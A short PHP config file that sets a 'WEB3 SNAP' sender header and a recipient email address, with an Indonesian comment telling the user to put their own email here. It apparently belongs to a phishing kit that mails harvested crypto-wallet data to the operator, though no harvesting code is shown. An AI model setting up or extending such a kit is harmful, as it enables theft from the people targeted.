<?php
$sender = 'From:  WEB3 SNAP || <rahdimas1@gmail.com>';

$email = 'rahdimas3@gmail.com';
 // GANTI EMAIL KAMU DISINI
?>